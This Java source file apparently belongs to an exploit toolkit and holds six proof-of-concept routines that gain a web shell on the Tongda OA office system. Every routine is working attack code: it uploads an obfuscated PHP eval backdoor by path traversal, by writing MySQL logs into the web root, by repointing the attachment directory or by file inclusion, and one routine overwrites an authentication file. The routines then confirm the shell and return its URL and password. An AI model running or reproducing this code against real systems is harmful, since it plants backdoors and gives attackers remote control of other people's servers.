package com.xinyu.poc;

import com.sun.org.apache.xpath.internal.operations.Bool;
import com.xinyu.tools.Other;
import com.xinyu.tools.Request;
import com.xinyu.tools.Response;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 后台GetShell的三种利用方式(已完成)
 */
public class GetShell {
    public static String getShell(String url, String poc, String cookie) {
        if (poc.equals("poc1")) {
            return poc1(url, cookie);
        } else if (poc.equals("poc2")) {
            return poc2(url, cookie);
        } else if (poc.equals("poc3")) {
            return poc3(url, cookie);
        } else if (poc.equals("poc6")) {
            return poc6(url, cookie);
        } else {
            System.out.println("未知的POC编号");
            return null;
        }
    }


    public static String poc1(String url, String cookie) {
        String shell_url = null; //记录WebShell地址及密码
        String random_filename = Other.getRandomFileName(); //获取一个随机文件名
        String payload = "/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./";

        //创建StringBuilder对象
        StringBuilder tempParams = new StringBuilder();
        tempParams.append("Content-Disposition: form-data; name=\"FILE1\"; filename=\"" + random_filename + ".php\"");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("<?php $a=\"~+d()\"^\"!{+{}\";$b=${$a}[\"x\"];eval(\"\".$b);echo \"" + random_filename + "\"?>");
        tempParams.append("\r\n");
        tempParams.append("--" + "********");
        tempParams.append("\r\n");

        //发送上传请求
        Request.upload(url + payload, tempParams, cookie + ";_SERVER=");

        //验证上传文件是否存在
        Response response = Request.get(url + "/_" + random_filename + ".php");
        if (response.getText().contains(random_filename)) {
            shell_url = url + "/_" + random_filename + ".php\n密码:x";
        }
        return shell_url;
    }


    public static String poc2(String url, String cookie) {
        String shell_url = null; //记录WebShell地址及密码
        String random_filename = Other.getRandomFileName(); //获取一个随机文件名
        String web_root = null;

        //获取WEB根目录
        Response response = Request.get(url + "/general/system/security/service.php", cookie + ";_SERVER=");
        web_root = Other.dataCleaning(response.getText(), Pattern.compile("name=\"WEBROOT\".+?value=\"(.+?)\""));
        web_root = web_root.replace("\\", "/"); //WEB根目录

        String log_directory = web_root.replace("webroot", "data5"); //日志目录

        System.out.println(web_root);
        System.out.println(log_directory);


        //写入部分数据
        StringBuilder tempParams = new StringBuilder();
        tempParams.append("Content-Disposition: form-data; name=\"sql_file\"; filename=\"" + random_filename + ".sql\"");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("set global general_log='on';SET global general_log_file='" + web_root + "/helloWorld.php';SELECT '<?php file_put_contents($_SERVER[\"DOCUMENT_ROOT\"].\"//" + random_filename + ".php\",base64_decode(\"PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJ4Il07ZXZhbCgiIi4kYik7Pz4=\").\"" + random_filename + "\");?><?php unlink(__FILE__);echo \"7bau8tlj\";?>';SET global general_log_file='" + log_directory + "/WIN-TEMP.log';SET global general_log='off';");
        tempParams.append("\r\n");
        tempParams.append("--" + "********");
        tempParams.append("\r\n");

        //发送上传请求
        Request.upload(url + "/general/system/database/sql.php", tempParams, cookie + ";_SERVER=");

        //验证上传文件是否存在
        Response response2 = Request.get(url + "/helloWorld.php");
        //访问检测helloWorld.php文件是否存在
        if (response2.getText().contains("7bau8tlj")) {
            //访问检测二次生成的shell文件是否存在
            if (Request.get(url + "/" + random_filename + ".php").getText().contains(random_filename)) {
                shell_url = url + "/" + random_filename + ".php\n密码:x";
            }
        }
        return shell_url;
    }


    public static String poc3(String url, String cookie) {
        String shell_url = null; //记录WebShell地址及密码
        String random_filename = Other.getRandomFileName(); //获取一个随机文件名
        String web_root = null;

        //获取WEB根目录
        Response response = Request.get(url + "/general/system/security/service.php", cookie + ";_SERVER=");
        web_root = Other.dataCleaning(response.getText(), Pattern.compile("name=\"WEBROOT\".+?value=\"(.+?)\""));
        web_root = web_root.replace("\\", "/"); //WEB根目录
        System.out.println(web_root);

        //第二步 设置附件上传目录为web目录
        Request.post(url + "/general/system/attachment/position/add.php", "POS_ID=177&POS_NAME=temp&POS_PATH=" + web_root + "&IS_ACTIVE=on", cookie + ";_SERVER=");


        //第三步 上传
        StringBuilder tempParams = new StringBuilder();
        tempParams.append("Content-Disposition: form-data; name=\"file\"; filename=\"" + random_filename + ".php.\"");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("<?php $a=\"~+d()\"^\"!{+{}\";$b=${$a}[\"x\"];eval(\"\".$b);echo \"" + random_filename + "\"?>");
        tempParams.append("\r\n");
        tempParams.append("--" + "********");
        tempParams.append("\r\n");

        Response response3 = Request.upload(url + "/module/upload/upload.php?module=im", tempParams, cookie + ";_SERVER=");
        Pattern pattern3 = Pattern.compile(".*?@(.*?)_(.*?),");
        Matcher matcher3 = pattern3.matcher(response3.getText());
        if (matcher3.find()) {
            String temp_url = url + "/im/" + matcher3.group(1) + "/" + matcher3.group(2) + "." + random_filename + ".php";
            String text = Request.get(temp_url).getText();
            if (text.contains(random_filename)) {
                shell_url = temp_url + "\n密码:x";
            }
        }

        return shell_url;
    }


    /**
     * 这是一个前台文件上传,需要配合文件包含
     *
     * @param url
     * @return
     */
    public static String[] poc4(String url) {
        String random_filename = Other.getRandomFileName();

        //上传
        StringBuilder tempParams = new StringBuilder();
        tempParams.append("Content-Disposition: form-data; name=\"UPLOAD_MODE\"");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("2");
        tempParams.append("\r\n");
        tempParams.append("--" + "********");
        tempParams.append("\r\n");
        tempParams.append("Content-Disposition: form-data; name=\"P\"");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("123");
        tempParams.append("\r\n");
        tempParams.append("--" + "********");
        tempParams.append("\r\n");
        tempParams.append("Content-Disposition: form-data; name=\"DEST_UID\"");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("1");
        tempParams.append("\r\n");
        tempParams.append("--" + "********");
        tempParams.append("\r\n");
        tempParams.append("Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"png\"");
        tempParams.append("\r\n");
        tempParams.append("Content-Type: image/jpeg");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("<?php file_put_contents($_SERVER[\"DOCUMENT_ROOT\"].\"//" + random_filename + ".php\",base64_decode(\"PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJ4Il07ZXZhbCgiIi4kYik7Pz4=\").\"" + random_filename + "\");?><?php unlink(__FILE__);echo \"" + random_filename + "\";?>");
        tempParams.append("\r\n");
        tempParams.append("--" + "********");
        tempParams.append("\r\n");
        Response response1 = Request.upload(url + "/ispirit/im/upload.php", tempParams);


        //提取包含文件的路径
        String text = response1.getText();
        System.out.println(text);
        Pattern pattern = Pattern.compile(".*?@(.*?)_(.*?)\\|");
        Matcher matcher = pattern.matcher(text);
        String temp = null;
        if (matcher.find()) {
            //返回 上传文件路径及随机文件名
            System.out.println("/attach/im/" + matcher.group(1) + "/" + matcher.group(2) + ".png");
            return new String[]{"/attach/im/" + matcher.group(1) + "/" + matcher.group(2) + ".png", random_filename};
        }
        return null;
    }


    /**
     * 上传处理文件,配合任意文件删除调用
     *
     * @param url
     * @return
     */
    public static void poc5(String url) {
        String shell_url = null; //记录WebShell地址及密码
        String random_filename = Other.getRandomFileName(); //获取一个随机文件名
        String payload = "/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./";

        //创建StringBuilder对象
        StringBuilder tempParams = new StringBuilder();
        tempParams.append("Content-Disposition: form-data; name=\"FILE1\"; filename=\"" + random_filename + ".php\"");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("<?php $file='_auth.inc.php';$newFile='inc/auth.inc.php';copy($file,$newFile);unlink($file);unlink(__FILE__);?>");
        tempParams.append("\r\n");
        tempParams.append("--" + "********");
        tempParams.append("\r\n");

        //发送上传请求
        Request.upload(url + payload, tempParams);

        //访问上传文件是否存在
        Response response = Request.get(url + "/_" + random_filename + ".php");
    }


    /**
     * 该POC v11.7版本 可用
     * 文件上传(后台) + 文件包含(后台)
     * 参考文章: https://lorexxar.cn/2021/03/03/tongda11-7rce/
     * @param url
     * @param cookie
     * @return
     */
    public static String poc6(String url, String cookie) {
        String shell_url = null; //记录WebShell地址及密码
        String random_filename = Other.getRandomFileName(); //获取一个随机文件名


        //1.文件上传
        StringBuilder tempParams = new StringBuilder(); //创建StringBuilder对象
        tempParams.append("Content-Disposition: form-data; name=\"FILE1\"; filename=\"" + random_filename + ".txt\"");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("<?php file_put_contents($_SERVER[\"DOCUMENT_ROOT\"].\"/" + random_filename + ".php\",base64_decode(\"PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJ4Il07ZXZhbCgiIi4kYik7Pz4=\")." + random_filename + ");?><?php unlink(__FILE__);?>");
        tempParams.append("\r\n");
        tempParams.append("--" + "********");
        tempParams.append("\r\n");
        Request.upload(url + "/general/reportshop/utils/upload.php?action=upload&newid=/../../../../general/reportshop/workshop/report/attachment-remark/", tempParams, cookie);


        //2.文件包含
        Request.get(url + "/ispirit/interface/gateway.php?json={}&url=general/reportshop/workshop/report/attachment-remark/}_" + random_filename + ".txt", cookie);
        System.out.println(url + "/ispirit/interface/gateway.php?json={}&url=general/reportshop/workshop/report/attachment-remark/}_" + random_filename + ".txt");


        shell_url = detectionShell(url + "/" + random_filename + ".php", random_filename);
        return shell_url;


    }


    /**
     * 验证shell是否存在
     */
    private static String detectionShell(String shell_url, String random_filename) {
        //验证上传文件是否存在
        Response response = Request.get(shell_url);
        if (response.getText().contains(random_filename)) {
            shell_url += "\n密码:x";
        } else {
            shell_url = null;
        }
        return shell_url;
    }


}
